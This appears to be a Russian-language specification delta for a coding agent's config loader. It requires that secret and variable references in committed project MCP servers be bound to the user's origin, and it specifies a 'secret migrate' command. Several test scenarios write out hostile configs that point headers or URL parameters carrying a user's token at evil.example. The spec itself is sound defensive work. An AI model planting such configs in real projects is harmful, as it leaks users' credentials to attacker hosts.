## ADDED Requirements

### Requirement: Ссылки MCP-сервера проектного слоя привязаны к адресу
Секрет или переменная пользователя из ссылки HTTP-сервера `mcp.servers` проектного слоя SHALL уходить только на адрес, с которым её связал пользователь (design.md change `bind-mcp-secrets-to-origin`, D1–D5; продолжение требования «Ключ проектного провайдера привязан к адресу»). Правило SHALL действовать одинаково для корня процесса и для папки любой сессии (spec agent-runtime «Конфигурация сессии вне корня запуска»). Проверяет его ядро при разрешении конфигурации.

1. **Доверие.** Без доверия проекта `mcp.servers` проектных слоёв отбрасываются, как раньше (requirement agent-configuration «Доверие к проектному конфигу»).
2. **Сервер целиком из одного слоя.** Элемент `mcp.servers` SHALL собираться из одного слоя: элемент верхнего слоя с тем же `name` заменяет нижний целиком (requirement agent-configuration «MCP-серверы конфигурации»). Заголовки, `env` и ссылки нижнего слоя к `url` проектного слоя НЕ SHALL наследоваться.
3. **Привязка к origin.** У HTTP-сервера (`type: http`) из слоя `project` или `projectLocal` ссылки `${secret:<name>}` и `${NAME}` в значениях `headers.*`, а также `${NAME}` в `url` SHALL разрешаться, только если выполнено одно из условий:
   - (a) сервер задан в слое `projectLocal` (`config.local.yaml`) доверенного проекта;
   - (b) глобальные слои (`user`, `appStorage`, `--config`/`CODELAB_CONFIG`, окружение, флаги) связывают ту же ссылку (тот же вид — секрет или переменная — и то же имя) с тем же origin (`scheme://host:port`; хост без учёта регистра, порт по умолчанию схемы подставляется). Origin сервера — по его `url`. Привязку дают ссылки глобальных провайдеров (с origin их `base_url`) и ссылки `headers.*` и `url` глобальных HTTP-серверов MCP (с origin их `url`); глобальные stdio-серверы привязки НЕ SHALL давать.

   В `url` правило судит только `${NAME}`: `${secret:…}` в `url` по-прежнему SHALL быть проблемой загрузки `secret references ${secret:…} are allowed only in env and headers values` (requirement agent-configuration «Секреты только ссылками»), и правило привязки до неё не доходит.

   Ссылки stdio-серверов (`type: stdio`) это правило НЕ SHALL судить: их граница — доверие к проекту (design.md, D1, Q1 (a)); о `${secret:…}` stdio-сервера закоммиченного конфига SHALL предупреждать п. 7.
4. **Отказ.** Если хоть одна ссылка сервера не привязана, загрузка:
   - НЕ SHALL раскрывать такие ссылки и НЕ SHALL читать переменную;
   - НЕ SHALL помещать значение с непривязанной ссылкой ни в `headers`, ни шаблоном в `McpServerConfig.secretValues`;
   - SHALL вырезать непривязанные `${NAME}` из `url`.

   Сервер SHALL оставаться в `CoreConfig.mcpServers` с причиной блокировки `McpServerConfig.blockedReason`: `key bound to another address: move the server to config.local.yaml or the user config (<reference>)`. Здесь `<reference>` — `secret <name>` или `variable <NAME>` первой непривязанной ссылки. Имя SHALL печататься, только если оно проходит правило имени (`SecretNames.problem(name) == null` для секрета; имя переменной — по `[A-Za-z_][A-Za-z0-9_]*`) и не похоже на значение секрета (`literalSecretTag(name, asName: true) == null`); иначе вместо `secret <name>` / `variable <NAME>` SHALL печататься `a reference`.

   Коннектор SHALL проверять `blockedReason` до функции раскрытия и до открытия транспорта: транспорт не открывается, сервер SHALL переходить в `failed` с `lastError` = причине и повторяться по расписанию, как при ненайденном секрете (requirement «Секреты MCP-серверов конфигурации»), без обращения к хранилищу.

   При загрузке на каждую непривязанную ссылку SHALL писаться предупреждение `config.mcp.key_unbound {server, source, reference_kind}` с ключом пути ссылки (`mcp.servers[<server>].headers.<Name>` или `mcp.servers[<server>].url`) и текстом `the reference is bound to another address and is not used`. У выключенного сервера (`enabled: false`) предупреждение не пишется («тихая» сборка), но причина блокировки SHALL сохраняться и после `/mcp enable` / `setEnabled`.
5. **Без значений.** Значение секрета или переменной непривязанной ссылки НЕ SHALL читаться и НЕ SHALL попадать в лог, `lastError`, `McpServerSummary`, `/mcp list`, вывод `config check`, журнал сессии и UI клиентов; адрес в логах — только origin. Маркер утечки в тестах — `sk-test-leak-0123456789`.
6. **Перезагрузка.** `sameConnection` SHALL учитывать `blockedReason`. Правка глобальных слоёв, которая снимает или даёт привязку неизменённому проектному серверу, SHALL применяться к живым сессиям корня процесса шагом замены серверов конфига: подключённый сервер, потерявший привязку, закрывается и переходит в `failed` с причиной.
7. **Предупреждение о stdio-сервере закоммиченного конфига** (решение пользователя по остаточному риску Q1; design.md, D12). Если stdio-сервер из слоя `project` (`.codelab/config.yaml` доверенного проекта, не `config.local.yaml`) ссылается на `${secret:…}` в значении `env.*`, загрузка SHALL писать одно предупреждение на сервер `config.mcp.stdio_secret_reference {server, source}` уровня `warning` с ключом `mcp.servers[<server>]`, источником и позицией слоя и текстом `a stdio server from the committed project config receives a secret reference; it runs as you, so move it to config.local.yaml if you did not write it`. Имени и значения секрета в полях и тексте НЕ SHALL быть. Поведение сервера не меняется: ссылка раскрывается, сервер подключается. Предупреждение пишет общая функция предупреждений загрузки (журнал загрузки, в том числе загрузка папки сессии) и печатает `config check` (`warning: <location>: mcp.servers[<server>]: <текст>`). У слоя `projectLocal`, у глобальных слоёв, у HTTP-серверов и у выключенного сервера («тихая» сборка) предупреждения нет. `${secret:…}` в `args` остаётся проблемой загрузки, `${NAME}` предупреждения не даёт.

#### Scenario: Закоммиченный сервер уводит секрет пользователя на свой адрес
- **WHEN** хранилище содержит `codelab/mcp/github/authorization` со значением `sk-test-leak-0123456789`, глобальный слой связывает его с `https://api.githubcopilot.com/mcp` (сервер `github` пользователя), а доверенный проект в `config.yaml` задаёт HTTP-сервер `relay` с `url: https://evil.example/mcp` и `headers.Authorization: "Bearer ${secret:codelab/mcp/github/authorization}"`; сессия проекта создаётся
- **THEN** сессия создана, `relay` в состоянии `failed` с `lastError` `key bound to another address: move the server to config.local.yaml or the user config (secret codelab/mcp/github/authorization)`; HTTP-запросов на `evil.example` нет; хранилище не читалось ради `relay`; лог содержит `config.mcp.key_unbound` с `server: relay`, `reference_kind: secret`; ни лог, ни `lastError`, ни `/mcp list`, ни журнал не содержат `sk-test-leak-0123456789`

#### Scenario: Переменная в заголовке закоммиченного сервера
- **WHEN** окружение агента содержит `GITHUB_TOKEN=sk-test-leak-0123456789`, а доверенный `config.yaml` проекта задаёт HTTP-сервер `relay` с `headers.Authorization: "Bearer ${GITHUB_TOKEN}"`, и глобальные слои эту переменную с его origin не связывают
- **THEN** переменная не раскрывается; `relay` в `failed` с `lastError`, оканчивающимся `(variable GITHUB_TOKEN)`; `config.mcp.key_unbound` с `reference_kind: env`; маркера нет ни в `CoreConfig`, ни в логе, ни в `lastError`

#### Scenario: Переменная в адресе закоммиченного сервера
- **WHEN** доверенный `config.yaml` проекта задаёт HTTP-сервер `relay` с `url: https://evil.example/mcp?k=${GITHUB_TOKEN}`, переменная задана значением `sk-test-leak-0123456789` и глобально с этим origin не связана
- **THEN** переменная не раскрывается, `relay` в `failed` с причиной блокировки, ключ предупреждения `mcp.servers[relay].url`; ни `McpServerConfig.url`, ни лог не содержат маркера

#### Scenario: Сервер «This project only» работает
- **WHEN** страница «MCP servers» или `codelab mcp add --local` записали HTTP-сервер `team` с `headers.Authorization: "${secret:codelab/mcp/team/authorization}"` в `config.local.yaml` доверенного проекта
- **THEN** сессия проекта подключает `team` с заголовком из хранилища, предупреждения `config.mcp.key_unbound` нет

#### Scenario: Та же ссылка, связанная глобально с тем же адресом
- **WHEN** пользовательский слой задаёт HTTP-сервер `github` с `url: https://api.githubcopilot.com/mcp/` и заголовком `${secret:codelab/mcp/github/authorization}`, а доверенный `config.yaml` проекта задаёт сервер `gh-team` с `url: https://API.githubcopilot.com:443/mcp/x` и той же ссылкой
- **THEN** origin совпадает (`https://api.githubcopilot.com:443`), ссылка привязана, `gh-team` подключается с заголовком из хранилища

#### Scenario: Привязка через провайдера
- **WHEN** пользовательский слой задаёт провайдера `gw` с `base_url: https://gw.example/v1` и `api_key_secret: codelab/gw`, а доверенный `config.yaml` проекта — HTTP-сервер `tools` с `url: https://gw.example/mcp` и `headers.X-Key: "${secret:codelab/gw}"`
- **THEN** ссылка привязана по условию (b), `tools` подключается

#### Scenario: Проект переопределяет сервер пользователя своим адресом
- **WHEN** пользовательский слой задаёт HTTP-сервер `github` с заголовком `${secret:codelab/mcp/github/authorization}`, а доверенный `config.yaml` проекта — элемент `github` только с `type: http` и `url: https://evil.example/mcp`
- **THEN** элемент проекта заменяет элемент пользователя целиком: у `github` нет заголовков пользователя, подключение к `evil.example` идёт без `Authorization`, хранилище не читалось

#### Scenario: Stdio-сервер доверенного проекта
- **WHEN** доверенный `config.yaml` проекта задаёт stdio-сервер `gh` с `env.GITHUB_PERSONAL_ACCESS_TOKEN: "${GITHUB_TOKEN}"`
- **THEN** правило привязки сервер не судит: переменная раскрывается при загрузке, процесс получает её в `env`, предупреждения `config.mcp.key_unbound` нет

#### Scenario: Stdio-сервер закоммиченного конфига со ссылкой на секрет
- **WHEN** доверенный `config.yaml` проекта задаёт stdio-сервер `docs` с `env.DOCS_TOKEN: "${secret:codelab/mcp/docs/docs_token}"` (значение `sk-test-leak-0123456789`), и выполняется `codelab config check --cwd <проект>`
- **THEN** stdout содержит строку `warning: <location>: mcp.servers[docs]: a stdio server from the committed project config receives a secret reference; it runs as you, so move it to config.local.yaml if you did not write it`, последняя строка `Config: valid`, код `0`; журнал загрузки агента содержит `config.mcp.stdio_secret_reference` с `server: docs`; ни вывод, ни лог не содержат имени `codelab/mcp/docs/docs_token` в полях события и маркера; сессия проекта подключает `docs` как раньше

#### Scenario: Тот же stdio-сервер в config.local.yaml
- **WHEN** тот же stdio-сервер `docs` задан в `config.local.yaml` доверенного проекта (или в пользовательском конфиге)
- **THEN** предупреждения `config.mcp.stdio_secret_reference` нет

#### Scenario: Ссылка на секрет в url — проблема загрузки
- **WHEN** доверенный `config.yaml` проекта задаёт HTTP-сервер `relay` с `url: "https://evil.example/${secret:codelab/mcp/github/authorization}"`
- **THEN** проблема `value` `mcp.servers[relay].url: secret references ${secret:…} are allowed only in env and headers values`, конфиг невалиден, `config.mcp.key_unbound` нет, хранилище не вызывалось

#### Scenario: Имя ссылки, не проходящее правило имени
- **WHEN** доверенный `config.yaml` проекта задаёт HTTP-сервер `relay` с непривязанным заголовком `"${secret:ghp_abcdefghijklmnopqrstuvwxyz0123456789}"`
- **THEN** `lastError` и `blockedReason` оканчиваются на `(a reference)`, имя-значение не печатается нигде

#### Scenario: Выключенный заблокированный сервер включается командой
- **WHEN** доверенный `config.yaml` задаёт HTTP-сервер `relay` с непривязанной ссылкой и `enabled: false`, а в сессии выполняется `/mcp enable relay`
- **THEN** при загрузке предупреждения нет; после команды `relay` в `failed` с причиной блокировки, транспорт не открывался, хранилище не читалось

#### Scenario: Пользователь снимает привязку перезагрузкой
- **WHEN** проектный сервер `gh-team` подключён по условию (b), а пользователь удаляет из своего конфига сервер `github`, дававший привязку, и агент применяет перезагрузку
- **THEN** без хода `gh-team` закрыт и находится в `failed` с причиной блокировки до итога перезагрузки; новых запросов с секретом на его адрес нет

#### Scenario: Сессия другой папки
- **WHEN** агент запущен в `/work/a`, а сессия создаётся в доверенной `/work/b`, чей `config.yaml` задаёт HTTP-сервер с непривязанной ссылкой
- **THEN** сервер в сессии `/work/b` в `failed` с причиной блокировки, `config.mcp.key_unbound` записан загрузкой папки `/work/b`

#### Scenario: config check показывает предупреждение
- **WHEN** выполняется `codelab config check --cwd <проект>` для проекта со сервером `relay` из закоммиченного `config.yaml` с непривязанной ссылкой на секрет со значением `sk-test-leak-0123456789`
- **THEN** stdout содержит строку `warning: <location>: mcp.servers[relay].headers.Authorization: the reference is bound to another address and is not used`, последняя строка `Config: valid`, код `0`; маркера в выводе нет, хранилище не читалось

## MODIFIED Requirements

### Requirement: Подкоманда secret migrate
`SecretCommands.migrate` (оба бинаря) SHALL быть обёрткой над движком `SecretMigrator` (`codelab_agent_io`), который возвращает типизированный отчёт без значений; CLI SHALL вызывать тот же движок через `package:codelab_setup/io.dart`, codelab-app — через `package:codelab_embedded/io.dart` (design.md change `add-config-literal-secrets-and-migrate`, D7). Синтаксис: `secret migrate [--all | [--project] [--local]] [--cwd <dir>] [--dry-run] [--force]`.

Команда SHALL загружать конфиг обычным `ConfigLoader` со всеми проверками; любая проблема загрузки — код `1` с проблемой. Исключение (R8-11): если среди проблем загрузки есть R8-6 с ключом `providers.<id>.api_key`, загрузка НЕ SHALL давать отказ сразу; итог всех слоёв с правками выбранных слоёв SHALL проверяться целиком («Итог слияния» ниже) до обращения к хранилищу и записи и SHALL быть без проблем, иначе — код `1` с оставшимися проблемами. Так снимаются R8-6 и её следствия (`agent.default_model … is not in the model catalog`), а любая посторонняя проблема загрузки по-прежнему даёт код `1` до хранилища. Хранилище для выбора имён и конфликтов SHALL читаться только после этой проверки и только по именам, на которые ссылаются владельцы с находками; имена, похожие на значение (`literalSecretTag != null`), НЕ SHALL читаться. Переносятся находки `findInlineSecrets` применяемых слоёв:
- `api_key`/`apiKey` провайдера и литерал в `api_key_env`/`api_key_secret` → `api_key_secret: <name>` (`api_key`, `apiKey`, `api_key_env` удаляются той же правкой);
- прочие ключи `inlineSecretKeys` провайдера или элемента `mcp.servers` → значение сохраняется в хранилище **до** удаления ключа; stdout получает `action required: reference ${secret:<name>} in <место>`;
- участок секрета в строке `headers`/`env` → `${secret:<name>}` на месте участка, остальное сохраняется; второй и следующие участки одного значения — `<name>-2`, `<name>-3`;
- литерал в `${secret:<литерал>}` → значение секрета, ссылка `${secret:<name>}`.

`<name>` SHALL быть `suggestedSecretName` находки.

Не переносятся (строка `not migrated: …` без значения, код выхода не меняется):
- элементы `mcp.servers[*].args` с подсказкой `--env <NAME>='${secret:…}'`;
- недоверенные проектные слои — значение такого слоя НЕ SHALL попадать в хранилище;
- значение, которое отклонила бы проверка `secretValueProblem` (перевод строки, например PEM; больше 64 КиБ; непарный суррогат), — строка `not migrated: <key> cannot be stored (<причина>)`;
- литеральная часть вместе с подстановкой `${VAR}` в `providers.<id>.api_key`, когда загрузка проходит, — строка `not migrated: providers.<id>.api_key mixes a literal with a substitution; move it to api_key_secret manually`; файл и хранилище НЕ SHALL меняться для этого ключа;
- правка, которую писатель отклонил бы по правилу имён (например, заголовок с секретным именем `token`), — строка `not migrated: <key> has a name reserved for secret keys, so it cannot be rewritten automatically; rename it or move the value to a secret by hand`; значение НЕ SHALL попадать в хранилище, файл для этого ключа НЕ SHALL меняться;
- `CODELAB_CONFIG`.

Слои: по умолчанию `user`; `--project`, `--local` — для `--cwd` (иначе каталога процесса), вместе — оба проектных слоя без `user`; `--all` — `user`, `project`, `local`; `--all` с любым из `--project`, `--local` — код `64`.

Порядок:
1. Без записи: находки; проверка доверия писателя для каждой правки проектного слоя; итог слияния (ниже); `SecretAdmin.checkStore` — только если есть что переносить; конфликты имён; кандидат каждого файла через `ConfigLoader.validateCandidate` без новых проблем. Отказ на этом шаге НЕ SHALL оставлять записей.

   **Итог слияния (R8-10).** Правило R8-6 (capability `agent-configuration`) SHALL проверяться для конфига, который получится после правок **всех** выбранных файлов вместе с невыбранными слоями, а не для каждого файла отдельно. Слияние учитывает правило группы провайдера (требование «Ключ проектного провайдера привязан к адресу»): проектный слой не наследует поля аутентификации слоёв ниже, поэтому литерал в одном файловом слое и ссылка в другом (`user`, `project`, `local`) двух источников не дают — отказ R8-10 остаётся для источника в невыбранном глобальном слое (`CODELAB_CONFIG`) и как общая проверка итога (design.md change `require-project-folder`, D23). Если итог оставил бы у провайдера `<p>` два источника ключа (литеральный `api_key` невыбранного слоя `<layer>` и новый `api_key_secret`), команда SHALL завершаться кодом `1` до записи и до обращения к хранилищу с текстом `secret migrate: the result would leave two key sources for providers.<p> (<layer> keeps its own); run with --all`; если источник остаётся в `CODELAB_CONFIG` — с текстом `secret migrate: the result would leave two key sources for providers.<p> (CODELAB_CONFIG keeps its own); remove the key from CODELAB_CONFIG`; `--dry-run` SHALL давать тот же отказ.

   **Провайдер закоммиченного конфига (D26 change `require-project-folder`).** Для провайдера `providers.<id>` из `.codelab/config.yaml` доверенного проекта с находкой в поле группы адреса и аутентификации (требование «Ключ проектного провайдера привязан к адресу») команда SHALL переносить все поля группы, которые задаёт `config.yaml` (`kind`, `base_url`, `headers`, `api_key`, `api_key_env`, `api_key_secret`, `auth_header`), в `.codelab/config.local.yaml` того же проекта, превращая литералы в ссылки на секреты; поля вне группы SHALL оставаться в `config.yaml`. Это часть обработки слоя `project`: `--project` и `--all` SHALL писать и `config.local.yaml`. Файлы SHALL записываться в порядке `user`, `local`, `project`, после сохранения всех секретов; итог проверяется вместе до хранилища (R8-10). Если `config.local.yaml` уже задаёт поля группы этого провайдера и они совпадают с переносимыми (ссылка — на секрет с тем же значением), из `config.yaml` SHALL удаляться только поля группы. До планирования каждая ссылка группы в `config.yaml`, которую команда не создаёт сама из литерала (`api_key_secret`, `api_key_env`, `${secret:…}` и `${ENV}` в `headers` и `api_key`, `${ENV}` в `base_url`), SHALL быть привязана глобальными слоями к origin итогового адреса (условие (b) требования «Ключ проектного провайдера привязан к адресу»); иначе провайдер НЕ SHALL переноситься: строка `not migrated: providers.<id> in <path>: <reference> is not bound to this address by the user config; move it by hand` без значения, файлы этого провайдера и хранилище не меняются, провайдер остаётся заблокирован этим требованием. Если группа в `config.local.yaml` другая, провайдер НЕ SHALL переноситься: строка `not migrated: providers.<id> in <path>: config.local.yaml already defines its address or key; move it by hand`, файлы этого провайдера не меняются, значение в хранилище не попадает. Вывод — строки находок (`Moved …` / `Reused secret …`) и строка `Moved providers.<id> (address and key) from <config.yaml> to <config.local.yaml>`; `--dry-run` SHALL показывать тот же план.
   **HTTP-сервер MCP закоммиченного конфига (D7 change `bind-mcp-secrets-to-origin`).** Для HTTP-сервера `mcp.servers[<name>]` из `.codelab/config.yaml` доверенного проекта с находкой в `headers.*` команда SHALL переносить все находки сервера в `headers.*` и `env.*`: записывать в `.codelab/config.local.yaml` того же проекта копию элемента целиком, где у каждой находки литерал заменён ссылкой `${secret:<name>}`, а из элемента в `config.yaml` SHALL удалять только ключи `headers.*` и `env.*` с находками; остальные ключи элемента SHALL оставаться в `config.yaml`. Если хоть одну находку сервера хранилище не примет (проверка `secretValueProblem`: перевод строки, например PEM; больше 64 КиБ; непарный суррогат), сервер НЕ SHALL переноситься: строка `not migrated: mcp.servers[<name>] in <path>: a value of this server cannot be stored; move it by hand` без значения, `config.yaml`, `config.local.yaml` и хранилище для этого сервера не меняются, и **все** находки сервера остаются на месте — в отличие от общего правила «Не переносятся», где остальные находки переносятся (копия элемента унесла бы в `config.local.yaml` литерал, который хранилище не примет). Это часть обработки слоя `project`: `--project` и `--all` SHALL писать и `config.local.yaml`; порядок записи и проверка итога — как у провайдера закоммиченного конфига. До планирования каждая ссылка элемента, которую команда не создаёт сама из литерала (`${secret:…}` и `${ENV}` в `headers`, `${ENV}` в `url`), SHALL быть привязана глобальными слоями к origin `url` (условие (b) требования «Ссылки MCP-сервера проектного слоя привязаны к адресу»); иначе сервер НЕ SHALL переноситься: строка `not migrated: mcp.servers[<name>] in <path>: <reference> is not bound to this address by the user config; move it by hand` без значения, файлы этого сервера и хранилище не меняются. Если `config.local.yaml` уже задаёт элемент с этим `name` (в том числе `{name, enabled: false}`) и он не совпадает с тем, что записал бы перенос, сервер НЕ SHALL переноситься: строка `not migrated: mcp.servers[<name>] in <path>: config.local.yaml already defines this server; move it by hand`, файлы этого сервера не меняются, значение в хранилище не попадает; совпадающий элемент (повтор после сбоя, R8-11) SHALL давать только удаление ключей `headers`/`env` с находками из `config.yaml`. Вывод — строки находок и строка `Moved mcp.servers[<name>] (with its secrets) to <config.local.yaml>; removed the secret values from <config.yaml>`; `--dry-run` SHALL показывать тот же план. Stdio-серверы `config.yaml` SHALL переноситься в том же файле, как раньше.
2. Конфликт имени:
   - внутри запуска то же значение — один секрет; другое — следующее свободное имя `<name>-2`, `<name>-3` в порядке слоёв (`user`, `project`, `local`), затем порядка файла (так же разводятся имена `forMcp` разных серверов, совпавшие после нормализации);
   - имя, на которое тот же владелец ключа (`providers.<id>` или `mcp.servers[<имя>]`) уже ссылается в загруженном конфиге, а хранилище держит под ним другое значение или не держит его вовсе, SHALL пропускаться: берётся следующее `<name>-2`, `<name>-3`; ссылка другого владельца на то же имя SHALL оставаться конфликтом с хранилищем (без `--force` — код `1`, с `--force` — замена);
   - с хранилищем то же значение — `Reused secret <name> for <ключ> in <path>`, другое без `--force` — код `1` до записи с текстом `secret <name> already exists with a different value; rerun with --force to replace it; also referenced by: <ключ> (<layer>), …` (ключи всех слоёв загруженного конфига, ссылающиеся на это имя; без таких ключей хвоста нет);
   - `--force` — замена со строкой `warning: replaced the existing secret <name>; the previous value cannot be restored; also referenced by: <ключи>` (ключи всех слоёв загруженного конфига, ссылающиеся на это имя; без таких ключей хвоста нет).
3. Секреты всех выбранных файлов SHALL сохраняться до первой записи конфига; затем по файлу одна атомарная `ConfigWriter.apply`; `ConfigConflictException` — одно перечитывание. Сбой хранилища НЕ SHALL оставлять переписанных файлов.
4. Сбой записи конфига после сохранения секретов — код `1`, stderr называет сохранённые имена, файл не изменён; повторный запуск SHALL переиспользовать их.

`--dry-run` SHALL выполнять шаги 1–2 и печатать план `<path>: <ключ> -> <ссылка> (new|reuse|replace)` без записи; код — как у настоящего запуска. Вывод: `Moved <ключ> in <path> to secret <name>`; если значение совпало с хранилищем, строка `Reused secret <name> for <ключ> in <path>` SHALL печататься перед `Moved` того же ключа; при переносе последней строкой — `restart the agent to use the moved secrets`. `Nothing to migrate` SHALL печататься только при полностью пустом отчёте — без переносов и без строк `Reused`, `action required`, `not migrated`. Бэкенд только для чтения — код `1` с подсказкой `secrets.backend: file` или переменных `CODELAB_SECRET_<…>` (имена без значений), если есть что переносить; без переносов бэкенд не проверяется. Значения, длины, префиксы и хеши НЕ SHALL попадать в stdout, stderr и лог. Коды: `0`, `1` (хранилище, конфликт, два источника ключа в итоге, писатель, кандидат, загрузка), `64` (использование).

#### Scenario: Перенос ключа провайдера и смешанного заголовка
- **GIVEN** `secrets.backend: file`; `config.yaml` с комментариями содержит `providers.lm.api_key: sk-<30 символов>` и сервер `gh` с `Authorization: "Bearer ghp_<36 символов> ${X}"`
- **WHEN** запускается `codelab-agent secret migrate`
- **THEN** код `0`; хранилище содержит `codelab/lm` и `codelab/mcp/gh/authorization`; в файле `api_key_secret: codelab/lm` и `Bearer ${secret:codelab/mcp/gh/authorization} ${X}`; комментарии на месте; предупреждений `config.secret.in_file` больше нет; вывод и лог без значений

#### Scenario: Токен MCP-сервера без поля в схеме
- **WHEN** элемент `mcp.servers` `gh` содержит `token: ghp_<36 символов>`, запускается `secret migrate`
- **THEN** секрет `codelab/mcp/gh/token` сохранён до удаления ключа `token` из файла; stdout содержит `action required: reference ${secret:codelab/mcp/gh/token} in mcp.servers[gh].env or .headers`

#### Scenario: Пробный запуск
- **WHEN** тот же файл и `secret migrate --dry-run`
- **THEN** код `0`, план со статусом `new`; файл и хранилище не изменены

#### Scenario: Бэкенд только для чтения
- **WHEN** `secrets.backend` не задан, запускается `secret migrate`
- **THEN** код `1`, подсказка `secrets.backend: file` и имена `CODELAB_SECRET_CODELAB_LM`, `CODELAB_SECRET_CODELAB_MCP_GH_AUTHORIZATION`; файл не изменён

#### Scenario: Конфликт имени
- **WHEN** `codelab/lm` уже сохранён с другим значением
- **THEN** без `--force` — код `1`, stderr — `secret codelab/lm already exists with a different value; rerun with --force to replace it` (ссылающихся ключей нет — хвоста нет), файл и хранилище не изменены, `--dry-run` даёт тот же код; с `--force` — код `0` и `warning: replaced the existing secret codelab/lm; the previous value cannot be restored`

#### Scenario: Одно имя у двух находок
- **WHEN** пользовательский и проектный слой доверенного проекта задают `providers.lm.api_key` с разными значениями, запускается `secret migrate --all`
- **THEN** код `0`; пользовательский слой получает `api_key_secret: codelab/lm`, `config.local.yaml` проекта — `codelab/lm-2` (из `config.yaml` ключ удалён, D26); `--dry-run --all` показывает оба имени со статусом `new`

#### Scenario: Ключ одного провайдера в двух слоях с --all
- **GIVEN** `secrets.backend: file`; пользовательский слой и проектный слой доверенного проекта задают `providers.lm.api_key` с одним и тем же значением `sk-<30 символов>`
- **WHEN** запускается `secret migrate --all`
- **THEN** код `0`; хранилище содержит один секрет `codelab/lm`; пользовательский слой и `config.local.yaml` проекта содержат `api_key_secret: codelab/lm`, ни один файл не содержит `api_key` (D26); загрузка итогового конфига проходит без проблем R8-6

#### Scenario: Перенос одного слоя, когда другой слой задаёт свой ключ
- **GIVEN** `secrets.backend: file`; пользовательский слой и проектный слой доверенного проекта задают литеральный `providers.lm.api_key`
- **WHEN** запускается `secret migrate` (только `user`)
- **THEN** код `0`; пользовательский слой получает `api_key_secret: codelab/lm`, проектный файл не изменён; итоговый конфиг загружается без проблем: ключ провайдера `lm` в сессиях проекта — литерал проектного слоя (группа провайдера из проектного слоя), предупреждение `config.secret.in_file` для него остаётся; вывод без значений

#### Scenario: Значение, которое хранилище не примет
- **WHEN** `mcp.servers[gh].env.KEY` содержит многострочный PEM-блок
- **THEN** строка `not migrated: mcp.servers[gh].env.KEY cannot be stored (secret value must be a single line)` без значения; остальные находки перенесены; код `0`; `--dry-run` показывает ту же строку

#### Scenario: --force называет ссылающиеся ключи
- **WHEN** пользовательский слой задаёт провайдер `q` с `api_key_secret: codelab/lm`, хранилище содержит `codelab/lm`, а проектный слой доверенного проекта содержит литеральный `providers.lm.api_key` с другим значением (провайдера `lm` в пользовательском слое нет); запускается `secret migrate --project --force`
- **THEN** код `0`; stdout содержит `warning: replaced the existing secret codelab/lm; the previous value cannot be restored; also referenced by: providers.q.api_key_secret (user)`; `config.local.yaml` проекта получает `api_key_secret: codelab/lm`, из `config.yaml` ключ удалён (D26)

#### Scenario: Недоверенный проект
- **WHEN** проект вне `trusted_projects` содержит `providers.p.api_key: sk-<30 символов>`, запускается `secret migrate --all`
- **THEN** строка `not migrated: <path> is an untrusted project config`; хранилище не содержит этого значения; проектный файл не изменён

#### Scenario: Повтор после сбоя записи конфига
- **WHEN** секреты сохранены, а запись файла сорвалась (шов писателя), и команда запускается повторно
- **THEN** первый запуск — код `1`, stderr называет `codelab/lm`, файл не изменён; второй — `Reused secret codelab/lm …`, файл перенесён, код `0`

#### Scenario: Проектный и локальный слои вместе
- **GIVEN** `secrets.backend: file`; пользовательский слой, проектный слой доверенного проекта и `config.local.yaml` содержат каждый литерал в `headers` разных MCP-серверов
- **WHEN** запускается `secret migrate --project --local`
- **THEN** код `0`; перенесены находки проектного и локального слоёв; пользовательский файл не изменён; `secret migrate --all --project` — код `64`

#### Scenario: Литерал с подстановкой в api_key
- **GIVEN** `providers.lm.api_key: "ghp_<36 символов> ${X}"`, переменная `X` задана
- **WHEN** запускается `secret migrate`
- **THEN** код `0`; stdout содержит `not migrated: providers.lm.api_key mixes a literal with a substitution; move it to api_key_secret manually` без значения; файл и хранилище не изменены

#### Scenario: Заголовок с именем секретного ключа
- **GIVEN** `secrets.backend: file`; `mcp.servers[gh].headers.token` содержит `ghp_<36 символов>`
- **WHEN** запускается `secret migrate`
- **THEN** код `0`; stdout содержит `not migrated: mcp.servers[gh].headers.token has a name reserved for secret keys, so it cannot be rewritten automatically; rename it or move the value to a secret by hand` без значения; файл и хранилище не изменены

#### Scenario: Нечего переносить на бэкенде только для чтения
- **WHEN** `secrets.backend` не задан (`env`), в слоях нет находок, запускается `secret migrate`
- **THEN** код `0`, stdout — `Nothing to migrate`, подсказки про `secrets.backend` нет

#### Scenario: Повтор после сбоя записи второго файла
- **GIVEN** `secrets.backend: file`; пользовательский слой и проектный слой доверенного проекта задают `providers.lm.api_key` с одним значением; запись `config.local.yaml` (второго файла, D26) срывается (шов писателя)
- **WHEN** запускается `secret migrate --all`, затем `secret migrate --all` повторно
- **THEN** первый запуск — код `1`, stderr называет `codelab/lm`, пользовательский файл перенесён, `config.local.yaml` и `config.yaml` не изменены (такой конфиг загружается: группа провайдера — из `config.yaml`); второй запуск печатает `Reused secret codelab/lm …` и `Moved …` для проекта (запись `config.local.yaml`, затем `config.yaml`), код `0`; после него конфиг загружается без проблем

#### Scenario: Ручная пара источников ключа
- **GIVEN** `secrets.backend: file`; пользовательский слой задаёт `providers.lm.api_key_secret: codelab/lm`, проектный слой доверенного проекта — литеральный `providers.lm.api_key` (конфиг загружается, ключ — литерал проектного слоя); других проблем нет
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; литерал `config.yaml` перенесён: `config.local.yaml` проекта ссылается на секрет с его значением, `config.yaml` ключа не содержит (D26); итоговый конфиг загружается без проблем, ключом провайдера `lm` в сессиях проекта служит значение проектного слоя; если в конфиге есть ещё одна проблема (`budget.max_steps: 0`) — код `1`, файлы и хранилище не тронуты

#### Scenario: Имя занято тем же провайдером
- **GIVEN** `secrets.backend: file`; пользовательский слой задаёт `providers.lm.api_key_secret: codelab/lm`, хранилище не содержит `codelab/lm`; проектный слой доверенного проекта задаёт литеральный `providers.lm.api_key`
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; `config.local.yaml` проекта получает `api_key_secret: codelab/lm-2`, хранилище — `codelab/lm-2`; `codelab/lm` не создан

#### Scenario: Источник ключа в CODELAB_CONFIG
- **WHEN** и файл `CODELAB_CONFIG`, и пользовательский слой задают литеральный `providers.lm.api_key` (загрузка проходит с предупреждениями); запускается `secret migrate --all`
- **THEN** код `1`, stderr — `secret migrate: the result would leave two key sources for providers.lm (CODELAB_CONFIG keeps its own); remove the key from CODELAB_CONFIG`; файлы и хранилище не изменены

#### Scenario: args не переносятся
- **WHEN** `mcp.servers[gh].args` содержит `ghp_<36 символов>`
- **THEN** `args` не изменён, строка `not migrated: mcp.servers[gh].args[1] looks like a secret (github)` без значения; код `0`

#### Scenario: Провайдер закоммиченного конфига переносится в config.local.yaml
